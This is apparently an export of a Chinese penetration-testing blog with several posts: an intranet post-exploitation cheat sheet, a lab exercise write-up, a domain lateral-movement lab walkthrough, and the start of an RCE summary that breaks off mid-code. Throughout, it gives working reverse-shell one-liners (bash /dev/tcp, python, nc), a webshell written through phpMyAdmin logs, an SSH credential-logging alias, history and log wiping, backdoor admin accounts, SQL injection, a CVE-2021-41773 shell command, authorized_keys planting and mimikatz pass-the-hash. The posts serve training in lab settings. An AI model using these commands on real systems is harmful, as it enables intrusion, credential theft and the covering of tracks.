-exec ls -ldb &#123;&#125; \; 2&gt;/dev/null</code></li></ul><p><strong>利用可用的root权限</strong></p><ul><li><code>sudo -l</code></li></ul><h3 id="自启动-1"><a href="#自启动-1" class="headerlink" title="自启动"></a>自启动</h3><ul><li>&#x2F;etc&#x2F;init.d</li><li>&#x2F;etc&#x2F;rc.d&#x2F;rc.local</li><li>~&#x2F;.bashrc</li><li>~&#x2F;.zshrc</li></ul><h3 id="后门-1"><a href="#后门-1" class="headerlink" title="后门"></a>后门</h3><p><strong>ssh 后门</strong></p><ul><li><code>alias ssh=&#39;strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh&#39;</code></li><li>后门账户</li></ul><p><strong>常见应用</strong></p><ul><li><p>ICMP</p></li><li><p>DNS</p></li><li><p>icmp后门</p></li><li><p>后门端口复用</p></li><li><p><code>.</code> 开头隐藏文件</p></li><li><p>rootkit</p></li></ul><h2 id="痕迹清理-1"><a href="#痕迹清理-1" class="headerlink" title="痕迹清理"></a>痕迹清理</h2><h3 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h3><ul><li><code>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null;</code></li><li><code>kill -9 $$</code> kill history</li><li><code>history -c</code></li><li>在 <code>HISTSIZE=0</code> 中设置 <code>HISTSIZE=0</code></li></ul><h3 id="清除-修改日志文件"><a href="#清除-修改日志文件" class="headerlink" title="清除&#x2F;修改日志文件"></a>清除&#x2F;修改日志文件</h3><ul><li><code>/var/log/btmp</code></li><li><code>/var/log/lastlog</code></li><li><code>/var/log/wtmp</code></li><li><code>/var/log/utmp</code></li><li><code>/var/log/secure</code></li><li><code>/var/log/message</code></li></ul><h3 id="登录痕迹"><a href="#登录痕迹" class="headerlink" title="登录痕迹"></a>登录痕迹</h3><ul><li><p>删除 <code>~/.ssh/known_hosts</code> 中记录</p></li><li><p>修改文件时间戳<code>touch –r</code></p></li><li><p>删除tmp目录临时文件</p></li></ul><h3 id="操作痕迹"><a href="#操作痕迹" class="headerlink" title="操作痕迹"></a>操作痕迹</h3><ul><li>vim 不记录历史命令 <code>:set history=0</code></li><li><ul><li>ssh 登录痕迹，无痕登录 <code>ssh -T user@host /bin/bash -i</code></li></ul></li></ul><h3 id="覆写文件"><a href="#覆写文件" class="headerlink" title="覆写文件"></a>覆写文件</h3><ul><li>shred</li><li>dd</li><li>wipe</li></ul><h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><ul><li>攻击和入侵很难完全删除痕迹，没有日志记录也是一种特征</li><li>即使删除本地日志，在网络设备、安全设备、集中化日志系统中仍有记录</li><li>留存的后门包含攻击者的信息</li><li>使用的代理或跳板可能会被反向入侵</li></ul><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul><li>在操作前检查是否有用户在线</li><li>删除文件使用磁盘覆写的功能删除</li><li>尽量和攻击前状态保持一致</li></ul><h2 id="综合技巧"><a href="#综合技巧" class="headerlink" title="综合技巧"></a>综合技巧</h2><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p><strong>windows</strong></p><ul><li>lcx</li><li>netsh</li></ul><p><strong>linux</strong></p><ul><li>portmap</li><li>iptables</li></ul><p><strong>socket代理</strong></p><ul><li>Win: xsocks</li><li>Linux: proxychains</li></ul><p><strong>基于http的转发与socket代理(低权限下的渗透)</strong></p><ul><li>端口转发: tunna</li><li>socks代理: reGeorg</li></ul><p><strong>ssh通道</strong></p><ul><li>端口转发</li><li>socks</li></ul><h3 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h3><p>常规shell反弹：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1<br><br>python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;<br><br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f<br></code></pre></td></tr></table></figure><p>突破防火墙的imcp_shell反弹</p><p>正向shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -e /bin/sh -lp 1234<br>nc.exe -e cmd.exe -lp 1234<br></code></pre></td></tr></table></figure><h3 id="内网文件传输"><a href="#内网文件传输" class="headerlink" title="内网文件传输"></a>内网文件传输</h3><p><strong>windows下文件传输</strong></p><ul><li>powershell</li><li>vbs脚本文件</li><li>bitsadmin</li><li>文件共享</li><li>使用telnet接收数据</li><li>hta</li></ul><p><strong>linux下文件传输</strong></p><ul><li>python</li><li>wget</li><li>tar + ssh</li><li>利用dns传输数据</li></ul><p><strong>文件编译</strong></p><ul><li>powershell将exe转为txt，再txt转为exe</li></ul><h3 id="远程连接-执行程序"><a href="#远程连接-执行程序" class="headerlink" title="远程连接 &amp;&amp; 执行程序"></a>远程连接 &amp;&amp; 执行程序</h3><ul><li>at&amp;schtasks</li><li>psexec</li><li>wmic</li><li>wmiexec.vbs</li><li>smbexec</li><li>powershell remoting</li><li>SC创建服务执行</li><li>schtasks</li><li>SMB+MOF || DLL Hijacks</li><li>PTH + compmgmt.msc</li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
      <tag>信息收集</tag>
      
      <tag>相关指令</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记录一次简单的渗透测试的练习</title>
    <link href="/2024/06/15/zuoye/"/>
    <url>/2024/06/15/zuoye/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一次简单的渗透测试的练习</p><h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><h2 id="192-168-18-200"><a href="#192-168-18-200" class="headerlink" title="192.168.18.200"></a>192.168.18.200</h2><p>扫描发现其存在phpmyadmin，尝试弱密码root&#x2F;root成功登入，利用日志文件写入一句话密码，在phpmyadmin的变量菜单中，对general log file的路径进行修改，修改为：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\phpStudy\PHPTutorial\WWW\test.php<br></code></pre></td></tr></table></figure><p><img src="/img/zuoye1.png" alt="zuoye1"></p><p>在phpmyadmin的后台SQL菜单中，执行命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-keyword">global</span> general_log <span class="hljs-operator">=</span> &quot;ON&quot;;<br></code></pre></td></tr></table></figure><p>以保持日志状态的开启</p><p>再在SQL菜单中，执行命令写入木马：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> &quot;&lt;?php eval($_POST[&#x27;test&#x27;]);?&gt;&quot;;<br></code></pre></td></tr></table></figure><p><img src="/img/zuoye2.png" alt="zuoye1"></p><p>使用蚁剑成功连接</p><p><img src="/img/zuoye3.png" alt="zuoye1"></p><p>连接后传入nc并弹shell到本地</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span>.exe <span class="hljs-number">192.168.22.113</span> <span class="hljs-number">7777</span> -e cmd.exe<br></code></pre></td></tr></table></figure><p>拿到shell后，重新创建账户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net user <span class="hljs-built_in">test</span> <span class="hljs-built_in">test</span> /add<br></code></pre></td></tr></table></figure><p>并将其添加进管理组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net localgroup administrators <span class="hljs-built_in">test</span> /add<br></code></pre></td></tr></table></figure><p>使用Windows自带的远程桌面连接3389端口，成功连接上远程桌面，然后上传mimikatz，使用mimikatz成功跑出Administrator用户的密码</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">sekurlas::logonpasswords<br></code></pre></td></tr></table></figure><p><img src="/img/zuoye4.png" alt="zuoye1"></p><p>使用此密码，成功获得管理员控制权限</p><p>查看发现还存在一张网卡192.168.22.2</p><p>上传lscan对其C段进行扫描，发现内网中还存在有一台主机192.168.22.3，发现其445端口开放，可能存在ms17-010（永恒之蓝）漏洞，在192.168.18.200机器上进行流量转发</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-built_in">add</span> v4tov4 <span class="hljs-attribute">listenaddress</span>=192.168.0.200 <span class="hljs-attribute">listenport</span>=445 <span class="hljs-attribute">connectaddress</span>=192.168.22.3<span class="hljs-built_in"> ip </span><span class="hljs-attribute">connectport</span>=445<br><br>netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-built_in">add</span> v4tov4 <span class="hljs-attribute">listenaddress</span>=192.168.0.200 <span class="hljs-attribute">listenport</span>=4444 <span class="hljs-attribute">connectaddress</span>=192.168.22.3<span class="hljs-built_in"> ip </span><span class="hljs-attribute">connectport</span>=4444<br></code></pre></td></tr></table></figure><p><img src="/img/zuoye8.png" alt="zuoye1"></p><p>使用msfconsole进行探测，发现果然存在ms17-010漏洞，设置Payload进行攻击利用，成功得到shell</p><p><img src="/img/zuoye9.png" alt="zuoye1"></p><h2 id="192-168-18-201"><a href="#192-168-18-201" class="headerlink" title="192.168.18.201"></a>192.168.18.201</h2><p>使用默认端口访问phpstudy后台运维系统页面，发现返回404 Not Found，访问&#x2F;user&#x2F;login路径也是404 Not Found，在此处抓包添加内容：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">X-Requested-<span class="hljs-keyword">With</span>: XMLHttpRequest<br></code></pre></td></tr></table></figure><p><img src="/img/zuoye5.png" alt="zuoye1"></p><p>访问到登录页面，采用堆叠注入更改密码，构造Payload：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">admin&#x27;;<span class="hljs-keyword">UPDATE</span> ADMINS <span class="hljs-keyword">set</span> <span class="hljs-keyword">PASSWORD</span> = <span class="hljs-string">&#x27;c26be8aaf53b15054896983b43eb6a65&#x27;</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span>;--<br></code></pre></td></tr></table></figure><p>成功修改admin账户密码为123456</p><p><img src="/img/zuoye6.png" alt="zuoye1"></p><p>无视报错，使用admin&#x2F;123456登录成功，若出现404 Not Found只需要重新抓包添加</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">X-Requested-<span class="hljs-keyword">With</span>: XMLHttpRequest<br></code></pre></td></tr></table></figure><p>即可，在计划任务菜单处，写入定时任务弹shell，成功在本地拿到root权限的shell</p><p><img src="/img/zuoye7.png" alt="zuoye1"></p><h2 id="192-168-18-202"><a href="#192-168-18-202" class="headerlink" title="192.168.18.202"></a>192.168.18.202</h2><p>存在Thinkphp5，该版本漏洞较多，使用<a href="https://github.com/bewhale/thinkphp_gui_tools">bewhale</a>检测发现存在<strong>ThinkPHP5 SQL注入漏洞</strong>、<strong>Thinkphp5远程代码执行</strong>、<strong>Thinkphp5文件包含漏洞</strong>、<strong>Thinkphp5数据库账户泄露漏洞</strong>等，直接用bewhale进行利用，成功拿到shell</p><h2 id="192-168-18-203"><a href="#192-168-18-203" class="headerlink" title="192.168.18.203"></a>192.168.18.203</h2><p>探测发现该IP的80端口下存在Apache服务且版本为2.4.49，该版本存在CVE-2021-41773路径穿越漏洞，直接反弹shell</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">curl -v --data <span class="hljs-string">&quot;echo;bash -i &gt;&amp; /dev/tcp/IP/端口 0&gt;&amp;1&quot;</span> <span class="hljs-string">&quot;http://192.168.18.203/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/zuoye10.png" alt="zuoye1"></p><p> 尝试输入相关的关键词，看看这题过滤了哪些内容” sRc DaTa OnFocus <sCriPt> <a hReF=javascript:alert()> &#106;查看源码可以发现，传入的参数都被实体化了查看源码发现原来还有其他隐藏的传参方法这里是get传参t_sort，并过滤掉了<>号，不能闭合插入标签但是我们还能用onclick事件，因为这里输入框被隐藏了，需要添加type="text"，构造payload​Payload：?t_sort=" onclick=javascript:alert() type="textPHP</p><p>利用JNDIExploit可以实现攻击，成功反弹shell，得到的权限为root</p><p><img src="/img/zuoye11.png" alt="zuoye1"></p><p>该IP的8888端口下存在Joomla系统，访问其后台管理页面/administrator，通过系统中的网站模板选项，可以在其模板中添加木马，使用蚁剑成功连接</p><p><img src="/img/zuoye12.png" alt="zuoye1"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网横向</tag>
      
      <tag>CVE</tag>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域渗透靶场-How2MoveLaterally</title>
    <link href="/2024/06/07/How2MoveLaterally/"/>
    <url>/2024/06/07/How2MoveLaterally/</url>
    
    <content type="html"><![CDATA[<h1 id="How2MoveLaterally"><a href="#How2MoveLaterally" class="headerlink" title="How2MoveLaterally"></a>How2MoveLaterally</h1><p>本环境是<a href="https://www.xbitsplatform.com/">xbitsplatform</a>靶场平台的基础环境之一，主要考察横向移动的知识点。从 linux 外围打点开始，经历几次横向移动后最后获得域管权限。</p><p>参考资料：<a href="https://www.freebuf.com/articles/web/369610.html">https://www.freebuf.com/articles/web/369610.html</a></p><h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="连接VPN"><a href="#连接VPN" class="headerlink" title="连接VPN"></a>连接VPN</h3><p>在<a href="https://www.xbitsplatform.com/">xbitsplatform</a>靶场输入<code>ls</code>，然后<code>cat How2MoveLaterally.txt</code>得到<code>.ovpn</code>文件，进行openvpn连接（连接的用户名和密码为文件名称，用户名：Anonymous 密码：helloworld）</p><h3 id="C段扫描"><a href="#C段扫描" class="headerlink" title="C段扫描"></a>C段扫描</h3><p>成功连接上VPN后，输入<code>route</code>对其路由进行查看，可以得到靶场的入口<code>IP：10.0.2.0</code>，使用<code>goby</code>工具对其进行C段扫描，成功得到相关存活IP，访问其中开放80端口的<code>10.0.2.152</code></p><p><img src="/img/yushentou1.png" alt="yushentou1"></p><h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><p>发现10.0.2.152为Cacti框架，且为1.2.22版本，在<a href="https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Cacti%20%E5%89%8D%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2022-46169.md">漏洞库</a>中发现其存在一个前台命令注入的漏洞，尝试利用，成功写入木马</p><p><img src="/img/yushentou2.png" alt="yushentou2"></p><h3 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h3><p>写入木马后，用蚁剑对其进行连接，发现在根目录存在<code>.dockerenv</code>，知道目前在docker容器内，访问<code>/dev</code>目录，发现其中存在很多文件，猜测docker容器为特权模式启动，可能存在逃逸，当前用户为<code>www-data</code>，权限较低，尝试进行提权</p><p>查找SUID文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;<br></code></pre></td></tr></table></figure><p>存在特殊文件<code>find</code>，<a href="https://gtfobins.github.io/">GTFOBins</a>查看如何利用</p><p>执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find . -exec /bin/sh -p -c whoami \; -quit<br></code></pre></td></tr></table></figure><p>成功提权</p><p><img src="/img/yushentou4.png" alt="yushentou4"></p><h3 id="Docker逃逸"><a href="#Docker逃逸" class="headerlink" title="Docker逃逸"></a>Docker逃逸</h3><p>在&#x2F;mnt目录下发现了一个已经挂载的目录，并且可读</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find . -exec /bin/sh -p -c &#x27;ls /mnt/cacti&#x27; \; -quit<br></code></pre></td></tr></table></figure><p>采取写入公钥的办法进行登录，使用<code>MobaXterm</code>生成一个公钥，并使用base64进行加密，传入<code>/mnt/cacti/root/.ssh/authorized_keys</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find . -exec /bin/sh -p -c &#x27;echo c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFEMitBNDM2TVAxbWZDRWZUL2hrd05vd1dJV1ZiZURDNWIzbDExRnpGc1l6M01PMityM1JPUDRXc09zdW9YQ2o0cjNwRXkxWDkwR1NoY2d6dmJ6VjJTMGc5UkJITmFqMXZ4NHBUZXpMOXpIeitiUXJseHJFR3J3KzlpVnUzNlMyR1NZcGNoUWxHZDJyQjFTQm1RT2QzZEwySURtdktVU01iamNjbEZaTGo4NnJhSHZEeVd0TitaT2xsUFAvcW9icmRuRVMzTnFzYlE2UVppUmJ2MGdqejRRSHZ4Vi9ZbmNCTzNvc0oxdVcwZ2pzWlR3OVhGSUxlMUJBeWNFeDFxMXJ0ejJKTEYyNjJkYTN6eVd1eXNYRldWNzRIM1Y2WTRzQzd2OWNTUGRvRHlMNnZmNGtFVlNHM1FQQzc1bXdzczdyY3FtWWJkUXp3cURsTGgrTlhBVEdZSDEgcnNhLWtleS0yMDI0MDYxMQ== | base64 -d &gt; /mnt/cacti/root/.ssh/authorized_keys&#x27; \; -quit<br></code></pre></td></tr></table></figure><p>成功连接</p><p><img src="/img/yushentou5.png" alt="yushentou5"></p><h3 id="Linux域信息搜集"><a href="#Linux域信息搜集" class="headerlink" title="Linux域信息搜集"></a>Linux域信息搜集</h3><p>查看dns，显示存在域，域控为<code>10.0.2.100</code></p><p>尝试ping，返回的<code>ttl</code>值为128，可知为Windows域</p><p><strong>Windows操作系统的初始TTL值为128，而Linux和Unix系统的初始TTL值为64</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /etc/resolv.conf<br></code></pre></td></tr></table></figure><p><img src="/img/yushentou6.png" alt="yushentou6"></p><p>查看具体的<code>ldap</code>配置，可知域为<code>MOVE.LAB</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /etc/krb5.conf<br></code></pre></td></tr></table></figure><p><img src="/img/yushentou7.png" alt="yushentou7"></p><p>搜索相关目录，尝试寻找和域相关的信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">grep -rn move.lab /etc<br>grep -rn move.lab /var/www/html<br></code></pre></td></tr></table></figure><p><img src="/img/yushentou8.png" alt="yushentou8"></p><p>得到了相关有效信息：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">域名：<span class="hljs-keyword">move</span>.<span class="hljs-keyword">lab</span>  <br>域控机器IP：10.0.2.100  <br>存在域账户：linux_ldap<br></code></pre></td></tr></table></figure><p>如果可以拿到 linux_ldap 这个用户的身份就可以先将域的 ldap 信息导出，在&#x2F;tmp 目录下发现了 linux_ldap 用户缓存的票据：</p><p><img src="/img/yushentou9.png" alt="yushentou9"></p><p>尝试设置环境变量为这个票据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">export KRB5CCNAME=/tmp/krb5cc_1680801105<br></code></pre></td></tr></table></figure><p>使用 ldapsearch 导出信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ldapsearch  -b &quot;dc=move,dc=lab&quot; -H ldap://10.0.2.100<br></code></pre></td></tr></table></figure><p>但显示认证失败</p><p><img src="/img/yushentou10.png" alt="yushentou10"></p><p>看来这些工具并不支持票据认证，使用 <a href="https://github.com/ropnop/impacket_static_binaries">impacket</a> 工具尝试，这里直接使用打包好的 elf 程序</p><p><strong>elf文件：目标文件再不同的系统或平台上具有不同的命名格式，在Unix和X86-64 Linux上称为ELF(Executable and Linkable Format, ELF)</strong></p><p>通过<code>/etc/krb5.keytab</code>利用<code>keytabextract.py</code>获取到了Linux机器的<code>hash</code></p><p>这样我们就可以用这个机器的身份来搜集 ldap 信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./GetADUsers_linux_x86_64  move.lab/cacti\$ -hashes 7eb5e976f35341c3a9aa667a7a701ec0:7eb5e976f35341c3a9aa667a7a701ec0  -all<br></code></pre></td></tr></table></figure><p>但<code>impacket</code>对于 <code>ldap</code> 信息搜集的不全，只有枚举用户的功能</p><p>使用<code>mimikatz</code>进行本地<code>PTH</code>（Pass-The-Hash哈希传递）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sekurlsa::pth /domain:move.lab /dc:dc.move.lab /user:cacti$ /ntlm:7eb5e976f35341c3a9aa667a7a701ec0<br></code></pre></td></tr></table></figure><p>使用<code>AdFind</code>成功导出<code>ldap</code>的信息</p><p><img src="/img/yushentou11.png" alt="yushentou11"></p><h3 id="定位域用户机器"><a href="#定位域用户机器" class="headerlink" title="定位域用户机器"></a>定位域用户机器</h3>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>域渗透</tag>
      
      <tag>docker逃逸</tag>
      
      <tag>内网横向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RCE总结</title>
    <link href="/2024/06/02/rce/"/>
    <url>/2024/06/02/rce/</url>
    
    <content type="html"><![CDATA[<p><strong>原文链接：<a href="https://paper.seebug.org/3162/">https://paper.seebug.org/3162/</a></strong></p><h1 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h1><p>在计算机安全中，任意代码执行(RCE)是攻击者在目标机器或目标进程中运行攻击者选择的任何命令或代码的能力。任意代码执行漏洞是软件或硬件中允许任意代码执行的安全漏洞。设计来利用这种漏洞的程序被称为任意代码执行漏洞。通过网络(特别是通过Internet等广域网)触发任意代码执行的能力通常被称为远程代码执行(RCE)</p><h2 id="shell符号使用"><a href="#shell符号使用" class="headerlink" title="shell符号使用"></a>shell符号使用</h2><p>在执行命令当中，我们会用到很多的shell符号，符号的用法如下：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cmd1 <span class="hljs-string">| cmd2 只执行cmd2 </span><br>cmd1 <span class="hljs-string">|| cmd2 只有当cmd1执行失败后，cmd2才被执行 </span><br>cmd1 <span class="hljs-meta">&amp; cmd2 先执行cmd1，不管是否成功，都会执行cmd2 </span><br>cmd1 <span class="hljs-meta">&amp;&amp; cmd2 先执行cmd1，cmd1执行成功后才执行cmd2，否则不执行cmd2</span><br></code></pre></td></tr></table></figure><p>Linux中支持分号进行拼接执行：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">cmd1</span> ; <span class="hljs-attribute">cmd2</span> <br></code></pre></td></tr></table></figure><p>PHP中支持<code>反引号</code>拼接执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> `whoami`;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="常规RCE"><a href="#常规RCE" class="headerlink" title="常规RCE"></a>常规RCE</h1><h2 id="基础RCE"><a href="#基础RCE" class="headerlink" title="基础RCE"></a>基础RCE</h2><h3 id="PHP基础命令-代码执行函数"><a href="#PHP基础命令-代码执行函数" class="headerlink" title="PHP基础命令&#x2F;代码执行函数"></a>PHP基础命令&#x2F;代码执行函数</h3><p>该方式最为常见，也是最为经典的方式，开发者因为没有对命令执行函数进行过滤，导致用户可以恶意传参造成的RCE</p><p>PHP下直接执行<strong>系统命令</strong>的函数如下：</p><h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><p>用于执行一个外部命令。它只返回命令的最后一行输出。可以通过一个可选的参数来获取命令的所有输出。还可以通过另一个可选的参数来获取命令的返回状态</p><h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h4><p>同样用于执行外部命令。会返回命令的完整输出作为一个字符串。不提供命令的返回状态</p><h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p>也是用于执行外部命令。它会立即显示输出（适合用于产生大量输出的命令）。返回命令的最后一行输出。可以通过一个可选的参数来获取命令的返回状态</p><h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h4><p>用于执行外部命令，并直接将原始输出传递给浏览器。常用于执行二进制文件或者需要直接传递数据流的情况（例如，输出图像或音频流）。不返回任何输出，但可以通过一个可选的参数来获取命令的返回状态</p><h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><p>一种简便的语法，用于在PHP代码中直接执行外部命令。类似于<code>shell_exec</code>，会捕获并返回命令的完整输出</p><h4 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h4><p>用于打开一个到外部命令的管道。允许你与外部命令进行读或写操作（但不同时支持两者）。返回一个文件指针，可用于进一步的 fread 或 fwrite 操作。使用 pclose 来关闭管道并获取命令的退出状态</p><h4 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start"></a>ob_start</h4><p>PHP 的一个函数，用于开启输出缓冲。这意味着脚本的输出（如 echo）不会立即发送到浏览器，而是存储在内部缓冲区中。这允许在输出发送到浏览器前对其进行修改。使用 <code>ob_end_flush()</code> 来发送缓冲区内容至浏览器。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;echo 1&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;echo 2&#x27;</span>);<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;echo 3&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-string">&#x27;echo 4&#x27;</span>);<br><span class="hljs-keyword">echo</span> `<span class="hljs-keyword">echo</span> <span class="hljs-number">5</span>`;<br><br><span class="hljs-variable">$test</span> = <span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-string">&#x27;echo 6&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$test</span>)&#123;<br>    <span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$test</span>))&#123;<br>        <span class="hljs-variable">$line</span> = <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$test</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$line</span>;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">pclose</span>(<span class="hljs-variable">$test</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">ob_start</span>(<span class="hljs-string">&quot;echo&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;7&quot;</span>;<br><span class="hljs-title function_ 